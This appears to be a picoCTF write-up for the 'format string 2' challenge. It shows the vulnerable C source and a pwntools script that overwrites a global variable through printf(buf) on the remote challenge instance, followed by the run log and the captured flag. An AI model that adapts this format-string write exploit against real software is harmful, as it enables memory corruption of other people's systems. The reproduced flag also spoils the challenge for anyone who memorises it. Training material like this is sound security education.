# format string 2
## Description
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc rhea.picoctf.net 55067
## Hint
- pwntools are very useful for this problem!
## Solution
- We're given [vuln](./vuln) and [vuln.c](./vuln.c) files. Looking at the source code:
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
- We can see that the program reads input from the user and prints it back. If the value of `sus` is changed to `0x67616c66`, the flag will be printed. Converting `0x67616c66` to ASCII gives `galf`. This is `flag` in little-endian format. 
- After going through a bit of pwntools' documentation, I found [this](https://docs.pwntools.com/en/stable/fmtstr.html) page. This automates the process of exploiting format string vulnerabilities. Here's the basic example code:
```python
program = pwnlib.data.elf.fmtstr.get('i386')
def exec_fmt(payload):
    p = process(program)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process(program, stderr=PIPE)
addr = unpack(p.recv(4))
payload = fmtstr_payload(offset, {addr: 0x1337babe})
p.sendline(payload)
print(hex(unpack(p.recv(4))))
```
- We need the address of `sus`, I used `objdump -d -M intel vuln` and found the address to be `0x404060`.
- Modifying the code to suit our needs, I wrote the following [script](<./format string 2.py>):
```python
from pwn import *
context.binary = ELF('./vuln')
p = remote('rhea.picoctf.net', 55067)
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 55067)
    p.sendline(payload)
    return p.recvall()
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
p.sendline(payload)
flag = p.recvall()
print("Flag: ", flag)
```
- It uses `FmtStr(exec_fmt)` to automatically determine the offset where the format string is written. It then uses `fmtstr_payload(offset, {0x404060: 0x67616c66})` to write the value `0x67616c66` to the address `0x404060`.
- Running the script we get the flag: 
```
python3 "format string 2.py"
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/Users/Dhruv1/Desktop/playground/SP/Taskphase/Cryptonite/cryptonite_taskphase_dhruv/STP_2/Binary_Exploitation/PicoCTF/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (194B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (195B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (189B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 55067
[+] Opening connection to rhea.picoctf.net on port 55067: Done
[+] Receiving all data: Done (204B)
[*] Closed connection to rhea.picoctf.net port 55067
[*] Found format string offset: 14
[+] Receiving all data: Done (594B)
[*] Closed connection to rhea.picoctf.net port 55067
Flag:  b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\nHere's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}"
```
- The flag is `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`.